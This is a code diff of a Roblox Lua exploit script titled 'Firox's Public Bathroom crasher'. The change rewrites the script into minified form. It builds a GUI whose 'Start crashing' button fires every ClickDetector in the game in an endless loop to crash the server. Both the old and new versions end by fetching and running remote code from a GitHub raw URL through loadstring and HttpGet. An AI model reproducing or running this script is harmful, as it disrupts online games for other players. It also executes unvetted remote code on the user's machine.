@@ -1,54 +1,5 @@
-
-
---[[
-Please dont skid :(
 ]]--
+Made by @FiroxV3 on V3rmillion
+--]]
 
-
-local ScreenGui = Instance.new("ScreenGui")
-local main = Instance.new("Frame")
-local StartCrashing = Instance.new("TextButton")
-local Name = Instance.new("TextButton")
-
---Properties:
-
-ScreenGui.Parent = game.CoreGui
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-main.Name = "main"
-main.Parent = ScreenGui
-main.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
-main.BorderColor3 = Color3.fromRGB(52, 52, 52)
-main.Position = UDim2.new(0.183807448, 0, 0.600979149, 0)
-main.Size = UDim2.new(0, 188, 0, 119)
-main.Active = true
-main.Draggable = true
-
-StartCrashing.Name = "StartCrashing"
-StartCrashing.Parent = main
-StartCrashing.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
-StartCrashing.BackgroundTransparency = 1.000
-StartCrashing.Position = UDim2.new(0.175531909, 0, 0.478991628, 0)
-StartCrashing.Size = UDim2.new(0, 122, 0, 36)
-StartCrashing.Font = Enum.Font.SourceSans
-StartCrashing.Text = "Start crashing"
-StartCrashing.TextColor3 = Color3.fromRGB(126, 126, 126)
-StartCrashing.TextSize = 20.000
-StartCrashing.MouseButton1Down:connect(function()
-	while true do wait(0)
-		fireclickdetector(game:GetService("Workspace")["Toilet Paper Dispenser"].Interactable.ClickDetector)
-	end
-end)
-
-
-Name.Name = "Name"
-Name.Parent = main
-Name.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
-Name.BorderColor3 = Color3.fromRGB(53, 53, 53)
-Name.Size = UDim2.new(0, 188, 0, 42)
-Name.Font = Enum.Font.SourceSans
-Name.Text = "Firox's Public Bathroom crasher"
-Name.TextColor3 = Color3.fromRGB(126, 126, 126)
-Name.TextSize = 16.000
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Firoxus/-/main/fps"))()
+local a=Instance.new("ScreenGui")local b=Instance.new("Frame")local c=Instance.new("TextButton")local d=Instance.new("TextButton")a.Parent=game.CoreGui;a.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;b.Name="main"b.Parent=a;b.BackgroundColor3=Color3.fromRGB(52,52,52)b.BorderColor3=Color3.fromRGB(52,52,52)b.Position=UDim2.new(0.183807448,0,0.600979149,0)b.Size=UDim2.new(0,188,0,119)b.Active=true;b.Draggable=true;c.Name="StartCrashing"c.Parent=b;c.BackgroundColor3=Color3.fromRGB(52,52,52)c.BackgroundTransparency=1.000;c.Position=UDim2.new(0.175531909,0,0.478991628,0)c.Size=UDim2.new(0,122,0,36)c.Font=Enum.Font.SourceSans;c.Text="Start crashing"c.TextColor3=Color3.fromRGB(126,126,126)c.TextSize=20.000;c.MouseButton1Down:connect(function()while true do wait(0)for e,f in pairs(game:GetDescendants())do if f:IsA("ClickDetector")then fireclickdetector(f)end end end end)d.Name="Name"d.Parent=b;d.BackgroundColor3=Color3.fromRGB(53,53,53)d.BorderColor3=Color3.fromRGB(53,53,53)d.Size=UDim2.new(0,188,0,42)d.Font=Enum.Font.SourceSans;d.Text="Firox's Public Bathroom crasher"d.TextColor3=Color3.fromRGB(126,126,126)d.TextSize=16.000;loadstring(game:HttpGet("https://raw.githubusercontent.com/Firoxus/-/main/fps"))()
